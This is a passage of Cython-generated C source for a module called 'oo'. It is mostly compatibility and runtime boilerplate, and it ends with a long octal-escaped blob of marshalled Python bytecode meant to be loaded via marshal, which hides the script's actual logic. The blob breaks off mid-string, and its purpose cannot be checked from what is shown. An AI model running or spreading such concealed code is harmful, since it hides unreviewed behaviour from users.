  #define __Pyx_PySequence_SIZE(seq)  PySequence_Size(seq)
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyIntObject                  PyLongObject
  #define PyInt_Type                   PyLong_Type
  #define PyInt_Check(op)              PyLong_Check(op)
  #define PyInt_CheckExact(op)         PyLong_CheckExact(op)
  #define PyInt_FromString             PyLong_FromString
  #define PyInt_FromUnicode            PyLong_FromUnicode
  #define PyInt_FromLong               PyLong_FromLong
  #define PyInt_FromSize_t             PyLong_FromSize_t
  #define PyInt_FromSsize_t            PyLong_FromSsize_t
  #define PyInt_AsLong                 PyLong_AsLong
  #define PyInt_AS_LONG                PyLong_AS_LONG
  #define PyInt_AsSsize_t              PyLong_AsSsize_t
  #define PyInt_AsUnsignedLongMask     PyLong_AsUnsignedLongMask
  #define PyInt_AsUnsignedLongLongMask PyLong_AsUnsignedLongLongMask
  #define PyNumber_Int                 PyNumber_Long
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyBoolObject                 PyLongObject
#endif
#if PY_MAJOR_VERSION >= 3 && CYTHON_COMPILING_IN_PYPY
  #ifndef PyUnicode_InternFromString
    #define PyUnicode_InternFromString(s) PyUnicode_FromString(s)
  #endif
#endif
#if PY_VERSION_HEX < 0x030200A4
  typedef long Py_hash_t;
  #define __Pyx_PyInt_FromHash_t PyInt_FromLong
  #define __Pyx_PyInt_AsHash_t   __Pyx_PyIndex_AsHash_t
#else
  #define __Pyx_PyInt_FromHash_t PyInt_FromSsize_t
  #define __Pyx_PyInt_AsHash_t   __Pyx_PyIndex_AsSsize_t
#endif
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyMethod_New(func, self, klass) ((self) ? ((void)(klass), PyMethod_New(func, self)) : __Pyx_NewRef(func))
#else
  #define __Pyx_PyMethod_New(func, self, klass) PyMethod_New(func, self, klass)
#endif
#if CYTHON_USE_ASYNC_SLOTS
  #if PY_VERSION_HEX >= 0x030500B1
    #define __Pyx_PyAsyncMethodsStruct PyAsyncMethods
    #define __Pyx_PyType_AsAsync(obj) (Py_TYPE(obj)->tp_as_async)
  #else
    #define __Pyx_PyType_AsAsync(obj) ((__Pyx_PyAsyncMethodsStruct*) (Py_TYPE(obj)->tp_reserved))
  #endif
#else
  #define __Pyx_PyType_AsAsync(obj) NULL
#endif
#ifndef __Pyx_PyAsyncMethodsStruct
    typedef struct {
        unaryfunc am_await;
        unaryfunc am_aiter;
        unaryfunc am_anext;
    } __Pyx_PyAsyncMethodsStruct;
#endif

#if defined(_WIN32) || defined(WIN32) || defined(MS_WINDOWS)
  #if !defined(_USE_MATH_DEFINES)
    #define _USE_MATH_DEFINES
  #endif
#endif
#include <math.h>
#ifdef NAN
#define __PYX_NAN() ((float) NAN)
#else
static CYTHON_INLINE float __PYX_NAN() {
  float value;
  memset(&value, 0xFF, sizeof(value));
  return value;
}
#endif
#if defined(__CYGWIN__) && defined(_LDBL_EQ_DBL)
#define __Pyx_truncl trunc
#else
#define __Pyx_truncl truncl
#endif

#define __PYX_MARK_ERR_POS(f_index, lineno) \
    { __pyx_filename = __pyx_f[f_index]; (void)__pyx_filename; __pyx_lineno = lineno; (void)__pyx_lineno; __pyx_clineno = __LINE__; (void)__pyx_clineno; }
#define __PYX_ERR(f_index, lineno, Ln_error) \
    { __PYX_MARK_ERR_POS(f_index, lineno) goto Ln_error; }

#ifndef __PYX_EXTERN_C
  #ifdef __cplusplus
    #define __PYX_EXTERN_C extern "C"
  #else
    #define __PYX_EXTERN_C extern
  #endif
#endif

#define __PYX_HAVE__oo
#define __PYX_HAVE_API__oo
/* Early includes */
#ifdef _OPENMP
#include <omp.h>
#endif /* _OPENMP */

#if defined(PYREX_WITHOUT_ASSERTIONS) && !defined(CYTHON_WITHOUT_ASSERTIONS)
#define CYTHON_WITHOUT_ASSERTIONS
#endif

typedef struct {PyObject **p; const char *s; const Py_ssize_t n; const char* encoding;
                const char is_unicode; const char is_str; const char intern; } __Pyx_StringTabEntry;

#define __PYX_DEFAULT_STRING_ENCODING_IS_ASCII 0
#define __PYX_DEFAULT_STRING_ENCODING_IS_UTF8 0
#define __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT (PY_MAJOR_VERSION >= 3 && __PYX_DEFAULT_STRING_ENCODING_IS_UTF8)
#define __PYX_DEFAULT_STRING_ENCODING ""
#define __Pyx_PyObject_FromString __Pyx_PyBytes_FromString
#define __Pyx_PyObject_FromStringAndSize __Pyx_PyBytes_FromStringAndSize
#define __Pyx_uchar_cast(c) ((unsigned char)c)
#define __Pyx_long_cast(x) ((long)x)
#define __Pyx_fits_Py_ssize_t(v, type, is_signed)  (\
    (sizeof(type) < sizeof(Py_ssize_t))  ||\
    (sizeof(type) > sizeof(Py_ssize_t) &&\
          likely(v < (type)PY_SSIZE_T_MAX ||\
                 v == (type)PY_SSIZE_T_MAX)  &&\
          (!is_signed || likely(v > (type)PY_SSIZE_T_MIN ||\
                                v == (type)PY_SSIZE_T_MIN)))  ||\
    (sizeof(type) == sizeof(Py_ssize_t) &&\
          (is_signed || likely(v < (type)PY_SSIZE_T_MAX ||\
                               v == (type)PY_SSIZE_T_MAX)))  )
static CYTHON_INLINE int __Pyx_is_valid_index(Py_ssize_t i, Py_ssize_t limit) {
    return (size_t) i < (size_t) limit;
}
#if defined (__cplusplus) && __cplusplus >= 201103L
    #include <cstdlib>
    #define __Pyx_sst_abs(value) std::abs(value)
#elif SIZEOF_INT >= SIZEOF_SIZE_T
    #define __Pyx_sst_abs(value) abs(value)
#elif SIZEOF_LONG >= SIZEOF_SIZE_T
    #define __Pyx_sst_abs(value) labs(value)
#elif defined (_MSC_VER)
    #define __Pyx_sst_abs(value) ((Py_ssize_t)_abs64(value))
#elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define __Pyx_sst_abs(value) llabs(value)
#elif defined (__GNUC__)
    #define __Pyx_sst_abs(value) __builtin_llabs(value)
#else
    #define __Pyx_sst_abs(value) ((value<0) ? -value : value)
#endif
static CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject*);
static CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject*, Py_ssize_t* length);
#define __Pyx_PyByteArray_FromString(s) PyByteArray_FromStringAndSize((const char*)s, strlen((const char*)s))
#define __Pyx_PyByteArray_FromStringAndSize(s, l) PyByteArray_FromStringAndSize((const char*)s, l)
#define __Pyx_PyBytes_FromString        PyBytes_FromString
#define __Pyx_PyBytes_FromStringAndSize PyBytes_FromStringAndSize
static CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char*);
#if PY_MAJOR_VERSION < 3
    #define __Pyx_PyStr_FromString        __Pyx_PyBytes_FromString
    #define __Pyx_PyStr_FromStringAndSize __Pyx_PyBytes_FromStringAndSize
#else
    #define __Pyx_PyStr_FromString        __Pyx_PyUnicode_FromString
    #define __Pyx_PyStr_FromStringAndSize __Pyx_PyUnicode_FromStringAndSize
#endif
#define __Pyx_PyBytes_AsWritableString(s)     ((char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsWritableSString(s)    ((signed char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsWritableUString(s)    ((unsigned char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsString(s)     ((const char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsSString(s)    ((const signed char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsUString(s)    ((const unsigned char*) PyBytes_AS_STRING(s))
#define __Pyx_PyObject_AsWritableString(s)    ((char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsWritableSString(s)    ((signed char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsWritableUString(s)    ((unsigned char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsSString(s)    ((const signed char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsUString(s)    ((const unsigned char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_FromCString(s)  __Pyx_PyObject_FromString((const char*)s)
#define __Pyx_PyBytes_FromCString(s)   __Pyx_PyBytes_FromString((const char*)s)
#define __Pyx_PyByteArray_FromCString(s)   __Pyx_PyByteArray_FromString((const char*)s)
#define __Pyx_PyStr_FromCString(s)     __Pyx_PyStr_FromString((const char*)s)
#define __Pyx_PyUnicode_FromCString(s) __Pyx_PyUnicode_FromString((const char*)s)
static CYTHON_INLINE size_t __Pyx_Py_UNICODE_strlen(const Py_UNICODE *u) {
    const Py_UNICODE *u_end = u;
    while (*u_end++) ;
    return (size_t)(u_end - u - 1);
}
#define __Pyx_PyUnicode_FromUnicode(u)       PyUnicode_FromUnicode(u, __Pyx_Py_UNICODE_strlen(u))
#define __Pyx_PyUnicode_FromUnicodeAndLength PyUnicode_FromUnicode
#define __Pyx_PyUnicode_AsUnicode            PyUnicode_AsUnicode
#define __Pyx_NewRef(obj) (Py_INCREF(obj), obj)
#define __Pyx_Owned_Py_None(b) __Pyx_NewRef(Py_None)
static CYTHON_INLINE PyObject * __Pyx_PyBool_FromLong(long b);
static CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject*);
static CYTHON_INLINE int __Pyx_PyObject_IsTrueAndDecref(PyObject*);
static CYTHON_INLINE PyObject* __Pyx_PyNumber_IntOrLong(PyObject* x);
#define __Pyx_PySequence_Tuple(obj)\
    (likely(PyTuple_CheckExact(obj)) ? __Pyx_NewRef(obj) : PySequence_Tuple(obj))
static CYTHON_INLINE Py_ssize_t __Pyx_PyIndex_AsSsize_t(PyObject*);
static CYTHON_INLINE PyObject * __Pyx_PyInt_FromSize_t(size_t);
static CYTHON_INLINE Py_hash_t __Pyx_PyIndex_AsHash_t(PyObject*);
#if CYTHON_ASSUME_SAFE_MACROS
#define __pyx_PyFloat_AsDouble(x) (PyFloat_CheckExact(x) ? PyFloat_AS_DOUBLE(x) : PyFloat_AsDouble(x))
#else
#define __pyx_PyFloat_AsDouble(x) PyFloat_AsDouble(x)
#endif
#define __pyx_PyFloat_AsFloat(x) ((float) __pyx_PyFloat_AsDouble(x))
#if PY_MAJOR_VERSION >= 3
#define __Pyx_PyNumber_Int(x) (PyLong_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Long(x))
#else
#define __Pyx_PyNumber_Int(x) (PyInt_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Int(x))
#endif
#define __Pyx_PyNumber_Float(x) (PyFloat_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Float(x))
#if PY_MAJOR_VERSION < 3 && __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
static int __Pyx_sys_getdefaultencoding_not_ascii;
static int __Pyx_init_sys_getdefaultencoding_params(void) {
    PyObject* sys;
    PyObject* default_encoding = NULL;
    PyObject* ascii_chars_u = NULL;
    PyObject* ascii_chars_b = NULL;
    const char* default_encoding_c;
    sys = PyImport_ImportModule("sys");
    if (!sys) goto bad;
    default_encoding = PyObject_CallMethod(sys, (char*) "getdefaultencoding", NULL);
    Py_DECREF(sys);
    if (!default_encoding) goto bad;
    default_encoding_c = PyBytes_AsString(default_encoding);
    if (!default_encoding_c) goto bad;
    if (strcmp(default_encoding_c, "ascii") == 0) {
        __Pyx_sys_getdefaultencoding_not_ascii = 0;
    } else {
        char ascii_chars[128];
        int c;
        for (c = 0; c < 128; c++) {
            ascii_chars[c] = c;
        }
        __Pyx_sys_getdefaultencoding_not_ascii = 1;
        ascii_chars_u = PyUnicode_DecodeASCII(ascii_chars, 128, NULL);
        if (!ascii_chars_u) goto bad;
        ascii_chars_b = PyUnicode_AsEncodedString(ascii_chars_u, default_encoding_c, NULL);
        if (!ascii_chars_b || !PyBytes_Check(ascii_chars_b) || memcmp(ascii_chars, PyBytes_AS_STRING(ascii_chars_b), 128) != 0) {
            PyErr_Format(
                PyExc_ValueError,
                "This module compiled with c_string_encoding=ascii, but default encoding '%.200s' is not a superset of ascii.",
                default_encoding_c);
            goto bad;
        }
        Py_DECREF(ascii_chars_u);
        Py_DECREF(ascii_chars_b);
    }
    Py_DECREF(default_encoding);
    return 0;
bad:
    Py_XDECREF(default_encoding);
    Py_XDECREF(ascii_chars_u);
    Py_XDECREF(ascii_chars_b);
    return -1;
}
#endif
#if __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT && PY_MAJOR_VERSION >= 3
#define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_DecodeUTF8(c_str, size, NULL)
#else
#define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_Decode(c_str, size, __PYX_DEFAULT_STRING_ENCODING, NULL)
#if __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
static char* __PYX_DEFAULT_STRING_ENCODING;
static int __Pyx_init_sys_getdefaultencoding_params(void) {
    PyObject* sys;
    PyObject* default_encoding = NULL;
    char* default_encoding_c;
    sys = PyImport_ImportModule("sys");
    if (!sys) goto bad;
    default_encoding = PyObject_CallMethod(sys, (char*) (const char*) "getdefaultencoding", NULL);
    Py_DECREF(sys);
    if (!default_encoding) goto bad;
    default_encoding_c = PyBytes_AsString(default_encoding);
    if (!default_encoding_c) goto bad;
    __PYX_DEFAULT_STRING_ENCODING = (char*) malloc(strlen(default_encoding_c) + 1);
    if (!__PYX_DEFAULT_STRING_ENCODING) goto bad;
    strcpy(__PYX_DEFAULT_STRING_ENCODING, default_encoding_c);
    Py_DECREF(default_encoding);
    return 0;
bad:
    Py_XDECREF(default_encoding);
    return -1;
}
#endif
#endif


/* Test for GCC > 2.95 */
#if defined(__GNUC__)     && (__GNUC__ > 2 || (__GNUC__ == 2 && (__GNUC_MINOR__ > 95)))
  #define likely(x)   __builtin_expect(!!(x), 1)
  #define unlikely(x) __builtin_expect(!!(x), 0)
#else /* !__GNUC__ or GCC < 2.95 */
  #define likely(x)   (x)
  #define unlikely(x) (x)
#endif /* __GNUC__ */
static CYTHON_INLINE void __Pyx_pretend_to_initialize(void* ptr) { (void)ptr; }

static PyObject *__pyx_m = NULL;
static PyObject *__pyx_d;
static PyObject *__pyx_b;
static PyObject *__pyx_cython_runtime = NULL;
static PyObject *__pyx_empty_tuple;
static PyObject *__pyx_empty_bytes;
static PyObject *__pyx_empty_unicode;
static int __pyx_lineno;
static int __pyx_clineno = 0;
static const char * __pyx_cfilenm= __FILE__;
static const char *__pyx_filename;


static const char *__pyx_f[] = {
  "oo.py",
};

/*--- Type declarations ---*/

/* --- Runtime support code (head) --- */
/* Refnanny.proto */
#ifndef CYTHON_REFNANNY
  #define CYTHON_REFNANNY 0
#endif
#if CYTHON_REFNANNY
  typedef struct {
    void (*INCREF)(void*, PyObject*, int);
    void (*DECREF)(void*, PyObject*, int);
    void (*GOTREF)(void*, PyObject*, int);
    void (*GIVEREF)(void*, PyObject*, int);
    void* (*SetupContext)(const char*, int, const char*);
    void (*FinishContext)(void**);
  } __Pyx_RefNannyAPIStruct;
  static __Pyx_RefNannyAPIStruct *__Pyx_RefNanny = NULL;
  static __Pyx_RefNannyAPIStruct *__Pyx_RefNannyImportAPI(const char *modname);
  #define __Pyx_RefNannyDeclarations void *__pyx_refnanny = NULL;
#ifdef WITH_THREAD
  #define __Pyx_RefNannySetupContext(name, acquire_gil)\
          if (acquire_gil) {\
              PyGILState_STATE __pyx_gilstate_save = PyGILState_Ensure();\
              __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__);\
              PyGILState_Release(__pyx_gilstate_save);\
          } else {\
              __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__);\
          }
#else
  #define __Pyx_RefNannySetupContext(name, acquire_gil)\
          __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__)
#endif
  #define __Pyx_RefNannyFinishContext()\
          __Pyx_RefNanny->FinishContext(&__pyx_refnanny)
  #define __Pyx_INCREF(r)  __Pyx_RefNanny->INCREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_DECREF(r)  __Pyx_RefNanny->DECREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_GOTREF(r)  __Pyx_RefNanny->GOTREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_GIVEREF(r) __Pyx_RefNanny->GIVEREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_XINCREF(r)  do { if((r) != NULL) {__Pyx_INCREF(r); }} while(0)
  #define __Pyx_XDECREF(r)  do { if((r) != NULL) {__Pyx_DECREF(r); }} while(0)
  #define __Pyx_XGOTREF(r)  do { if((r) != NULL) {__Pyx_GOTREF(r); }} while(0)
  #define __Pyx_XGIVEREF(r) do { if((r) != NULL) {__Pyx_GIVEREF(r);}} while(0)
#else
  #define __Pyx_RefNannyDeclarations
  #define __Pyx_RefNannySetupContext(name, acquire_gil)
  #define __Pyx_RefNannyFinishContext()
  #define __Pyx_INCREF(r) Py_INCREF(r)
  #define __Pyx_DECREF(r) Py_DECREF(r)
  #define __Pyx_GOTREF(r)
  #define __Pyx_GIVEREF(r)
  #define __Pyx_XINCREF(r) Py_XINCREF(r)
  #define __Pyx_XDECREF(r) Py_XDECREF(r)
  #define __Pyx_XGOTREF(r)
  #define __Pyx_XGIVEREF(r)
#endif
#define __Pyx_XDECREF_SET(r, v) do {\
        PyObject *tmp = (PyObject *) r;\
        r = v; __Pyx_XDECREF(tmp);\
    } while (0)
#define __Pyx_DECREF_SET(r, v) do {\
        PyObject *tmp = (PyObject *) r;\
        r = v; __Pyx_DECREF(tmp);\
    } while (0)
#define __Pyx_CLEAR(r)    do { PyObject* tmp = ((PyObject*)(r)); r = NULL; __Pyx_DECREF(tmp);} while(0)
#define __Pyx_XCLEAR(r)   do { if((r) != NULL) {PyObject* tmp = ((PyObject*)(r)); r = NULL; __Pyx_DECREF(tmp);}} while(0)

/* PyObjectGetAttrStr.proto */
#if CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStr(PyObject* obj, PyObject* attr_name);
#else
#define __Pyx_PyObject_GetAttrStr(o,n) PyObject_GetAttr(o,n)
#endif

/* Import.proto */
static PyObject *__Pyx_Import(PyObject *name, PyObject *from_list, int level);

/* GetBuiltinName.proto */
static PyObject *__Pyx_GetBuiltinName(PyObject *name);

/* PyDictVersioning.proto */
#if CYTHON_USE_DICT_VERSIONS && CYTHON_USE_TYPE_SLOTS
#define __PYX_DICT_VERSION_INIT  ((PY_UINT64_T) -1)
#define __PYX_GET_DICT_VERSION(dict)  (((PyDictObject*)(dict))->ma_version_tag)
#define __PYX_UPDATE_DICT_CACHE(dict, value, cache_var, version_var)\
    (version_var) = __PYX_GET_DICT_VERSION(dict);\
    (cache_var) = (value);
#define __PYX_PY_DICT_LOOKUP_IF_MODIFIED(VAR, DICT, LOOKUP) {\
    static PY_UINT64_T __pyx_dict_version = 0;\
    static PyObject *__pyx_dict_cached_value = NULL;\
    if (likely(__PYX_GET_DICT_VERSION(DICT) == __pyx_dict_version)) {\
        (VAR) = __pyx_dict_cached_value;\
    } else {\
        (VAR) = __pyx_dict_cached_value = (LOOKUP);\
        __pyx_dict_version = __PYX_GET_DICT_VERSION(DICT);\
    }\
}
static CYTHON_INLINE PY_UINT64_T __Pyx_get_tp_dict_version(PyObject *obj);
static CYTHON_INLINE PY_UINT64_T __Pyx_get_object_dict_version(PyObject *obj);
static CYTHON_INLINE int __Pyx_object_dict_version_matches(PyObject* obj, PY_UINT64_T tp_dict_version, PY_UINT64_T obj_dict_version);
#else
#define __PYX_GET_DICT_VERSION(dict)  (0)
#define __PYX_UPDATE_DICT_CACHE(dict, value, cache_var, version_var)
#define __PYX_PY_DICT_LOOKUP_IF_MODIFIED(VAR, DICT, LOOKUP)  (VAR) = (LOOKUP);
#endif

/* GetModuleGlobalName.proto */
#if CYTHON_USE_DICT_VERSIONS
#define __Pyx_GetModuleGlobalName(var, name)  {\
    static PY_UINT64_T __pyx_dict_version = 0;\
    static PyObject *__pyx_dict_cached_value = NULL;\
    (var) = (likely(__pyx_dict_version == __PYX_GET_DICT_VERSION(__pyx_d))) ?\
        (likely(__pyx_dict_cached_value) ? __Pyx_NewRef(__pyx_dict_cached_value) : __Pyx_GetBuiltinName(name)) :\
        __Pyx__GetModuleGlobalName(name, &__pyx_dict_version, &__pyx_dict_cached_value);\
}
#define __Pyx_GetModuleGlobalNameUncached(var, name)  {\
    PY_UINT64_T __pyx_dict_version;\
    PyObject *__pyx_dict_cached_value;\
    (var) = __Pyx__GetModuleGlobalName(name, &__pyx_dict_version, &__pyx_dict_cached_value);\
}
static PyObject *__Pyx__GetModuleGlobalName(PyObject *name, PY_UINT64_T *dict_version, PyObject **dict_cached_value);
#else
#define __Pyx_GetModuleGlobalName(var, name)  (var) = __Pyx__GetModuleGlobalName(name)
#define __Pyx_GetModuleGlobalNameUncached(var, name)  (var) = __Pyx__GetModuleGlobalName(name)
static CYTHON_INLINE PyObject *__Pyx__GetModuleGlobalName(PyObject *name);
#endif

/* PyObjectCall.proto */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_Call(PyObject *func, PyObject *arg, PyObject *kw);
#else
#define __Pyx_PyObject_Call(func, arg, kw) PyObject_Call(func, arg, kw)
#endif

/* PyThreadStateGet.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_PyThreadState_declare  PyThreadState *__pyx_tstate;
#define __Pyx_PyThreadState_assign  __pyx_tstate = __Pyx_PyThreadState_Current;
#define __Pyx_PyErr_Occurred()  __pyx_tstate->curexc_type
#else
#define __Pyx_PyThreadState_declare
#define __Pyx_PyThreadState_assign
#define __Pyx_PyErr_Occurred()  PyErr_Occurred()
#endif

/* PyErrFetchRestore.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_PyErr_Clear() __Pyx_ErrRestore(NULL, NULL, NULL)
#define __Pyx_ErrRestoreWithState(type, value, tb)  __Pyx_ErrRestoreInState(PyThreadState_GET(), type, value, tb)
#define __Pyx_ErrFetchWithState(type, value, tb)    __Pyx_ErrFetchInState(PyThreadState_GET(), type, value, tb)
#define __Pyx_ErrRestore(type, value, tb)  __Pyx_ErrRestoreInState(__pyx_tstate, type, value, tb)
#define __Pyx_ErrFetch(type, value, tb)    __Pyx_ErrFetchInState(__pyx_tstate, type, value, tb)
static CYTHON_INLINE void __Pyx_ErrRestoreInState(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb);
static CYTHON_INLINE void __Pyx_ErrFetchInState(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);
#if CYTHON_COMPILING_IN_CPYTHON
#define __Pyx_PyErr_SetNone(exc) (Py_INCREF(exc), __Pyx_ErrRestore((exc), NULL, NULL))
#else
#define __Pyx_PyErr_SetNone(exc) PyErr_SetNone(exc)
#endif
#else
#define __Pyx_PyErr_Clear() PyErr_Clear()
#define __Pyx_PyErr_SetNone(exc) PyErr_SetNone(exc)
#define __Pyx_ErrRestoreWithState(type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetchWithState(type, value, tb)  PyErr_Fetch(type, value, tb)
#define __Pyx_ErrRestoreInState(tstate, type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetchInState(tstate, type, value, tb)  PyErr_Fetch(type, value, tb)
#define __Pyx_ErrRestore(type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetch(type, value, tb)  PyErr_Fetch(type, value, tb)
#endif

/* CLineInTraceback.proto */
#ifdef CYTHON_CLINE_IN_TRACEBACK
#define __Pyx_CLineForTraceback(tstate, c_line)  (((CYTHON_CLINE_IN_TRACEBACK)) ? c_line : 0)
#else
static int __Pyx_CLineForTraceback(PyThreadState *tstate, int c_line);
#endif

/* CodeObjectCache.proto */
typedef struct {
    PyCodeObject* code_object;
    int code_line;
} __Pyx_CodeObjectCacheEntry;
struct __Pyx_CodeObjectCache {
    int count;
    int max_count;
    __Pyx_CodeObjectCacheEntry* entries;
};
static struct __Pyx_CodeObjectCache __pyx_code_cache = {0,0,NULL};
static int __pyx_bisect_code_objects(__Pyx_CodeObjectCacheEntry* entries, int count, int code_line);
static PyCodeObject *__pyx_find_code_object(int code_line);
static void __pyx_insert_code_object(int code_line, PyCodeObject* code_object);

/* AddTraceback.proto */
static void __Pyx_AddTraceback(const char *funcname, int c_line,
                               int py_line, const char *filename);

/* PyExec.proto */
static PyObject* __Pyx_PyExec3(PyObject*, PyObject*, PyObject*);
static CYTHON_INLINE PyObject* __Pyx_PyExec2(PyObject*, PyObject*);

/* GetAttr.proto */
static CYTHON_INLINE PyObject *__Pyx_GetAttr(PyObject *, PyObject *);

/* Globals.proto */
static PyObject* __Pyx_Globals(void);

/* GCCDiagnostics.proto */
#if defined(__GNUC__) && (__GNUC__ > 4 || (__GNUC__ == 4 && __GNUC_MINOR__ >= 6))
#define __Pyx_HAS_GCC_DIAGNOSTIC
#endif

/* CIntToPy.proto */
static CYTHON_INLINE PyObject* __Pyx_PyInt_From_long(long value);

/* CIntFromPy.proto */
static CYTHON_INLINE long __Pyx_PyInt_As_long(PyObject *);

/* CIntFromPy.proto */
static CYTHON_INLINE int __Pyx_PyInt_As_int(PyObject *);

/* FastTypeChecks.proto */
#if CYTHON_COMPILING_IN_CPYTHON
#define __Pyx_TypeCheck(obj, type) __Pyx_IsSubtype(Py_TYPE(obj), (PyTypeObject *)type)
static CYTHON_INLINE int __Pyx_IsSubtype(PyTypeObject *a, PyTypeObject *b);
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches(PyObject *err, PyObject *type);
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches2(PyObject *err, PyObject *type1, PyObject *type2);
#else
#define __Pyx_TypeCheck(obj, type) PyObject_TypeCheck(obj, (PyTypeObject *)type)
#define __Pyx_PyErr_GivenExceptionMatches(err, type) PyErr_GivenExceptionMatches(err, type)
#define __Pyx_PyErr_GivenExceptionMatches2(err, type1, type2) (PyErr_GivenExceptionMatches(err, type1) || PyErr_GivenExceptionMatches(err, type2))
#endif
#define __Pyx_PyException_Check(obj) __Pyx_TypeCheck(obj, PyExc_Exception)

/* CheckBinaryVersion.proto */
static int __Pyx_check_binary_version(void);

/* InitStrings.proto */
static int __Pyx_InitStrings(__Pyx_StringTabEntry *t);


/* Module declarations from 'oo' */
#define __Pyx_MODULE_NAME "oo"
extern int __pyx_module_is_main_oo;
int __pyx_module_is_main_oo = 0;

/* Implementation of 'oo' */
static const char __pyx_k_main[] = "__main__";
static const char __pyx_k_name[] = "__name__";
static const char __pyx_k_test[] = "__test__";
static const char __pyx_k_loads[] = "loads";
static const char __pyx_k_import[] = "__import__";
static const char __pyx_k_marshal[] = "marshal";
static const char __pyx_k_builtins[] = "__builtins__";
static const char __pyx_k_cline_in_traceback[] = "cline_in_traceback";
static const char __pyx_k_s_d_d_l_Z_d_d_l_Z_d_d_l_Z_d_d_l[] = "\343\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\024\000\000\000@\000\000\000s\310\003\000\000d\000d\001l\000Z\000d\000d\001l\001Z\001d\000d\001l\002Z\002d\000d\001l\003Z\003d\000d\001l\004Z\004e\000\240\005d\002\241\001\001\000e\000\240\005d\003\241\001\001\000G\000d\004d\005\204\000d\005\203\002Z\006d\006Z\007d\007d\010\204\000Z\010d\td\n\204\000Z\td\013d\014\204\000Z\nd\000d\001l\000Z\000d\000d\001l\001Z\001d\000d\001l\002Z\002d\000d\001l\013Z\013d\000d\001l\014Z\014d\000d\001l\rZ\rd\000d\001l\016Z\016d\000d\001l\017Z\017d\000d\001l\020Z\020d\000d\001l\004Z\004e\000\240\005d\002\241\001\001\000d\000d\rl\021m\022Z\023\001\000d\000d\rl\021m\022Z\022\001\000d\000d\001l\003Z\024d\000d\016l\025m\026Z\026\001\000d\000d\017l\025m\025Z\025\001\000d\000d\020l\002m\027Z\027\001\000d\000d\020l\002m\027Z\030\001\000z\026d\000d\001l\003Z\003d\000d\021l\031m\032Z\033\001\000d\000d\001l\034Z\034d\000d\022l\035m\036Z\036\001\000W\000n\023\004\000e\037y\261\001\000\001\000\001\000e\000\240\005d\023\241\001\001\000e\000\240\005d\024\241\001\001\000Y\000n\001w\000d\025d\026\204\000Z d\027d\030\204\000Z!G\000d\031d\005\204\000d\005\203\002Z\006d\032Z\"d\033Z#d\034Z$d\035Z%d\036Z&d\037Z'd\033Z(d\032Z)d Z*d!Z+d\"Z,d#Z-d$Z.d%Z/d&Z0d'Z1d(Z2d)Z3d*Z4d+Z5d,Z6d-Z7d.Z8e(e)e*e+e,e-e.e/g\010Z9e\014\240:e9\241\001Z;e\025\240<\241\000Z<e<\240=d/\241\001Z>e\025\240<\241\000Z?e?j@ZAe?jBZCe?jDZEe\026\240F\241\000ZFd0Z\007d\000aGg\000aHg\000aId1d2\204\000ZJd\000d3l\002mKZL\001\000d\000d4l\000m\005ZM\001\000eNeL\203\000d5\031\000\203\001ZOeOd6k\004\220\001rCeOd6\030\000ZPd7ZQn\004eOZPd8ZQz\032eRd9\203\001\001\000d:ZSd;ZTd;ZTeUeS\203\001eTv\000\220\001r_e\000\240\005d2\241\001\001\000n\001\t\000W\000n\010\001\000\001\000\001\000eRd<\203\001\001\000Y\000d=d>\204\000ZVg\000ZWg\000ZXeYd?\203\001D\000]`ZZd@Z[e\014\240:g\000dA\242\001\241\001Z\\dBZ]e\014\240:g\000dC\242\001\241\001Z^e\014\240_dDdE\241\002Z`e\014\240:g\000dC\242\001\241\001ZadFZbe\014\240_dGdH\241\002ZcdIZde\014\240_dJdK""\241\002Zee\014\240_dLdM\241\002ZfdNZge[\233\000dOe\\\233\000dPe]\233\000e^\233\000e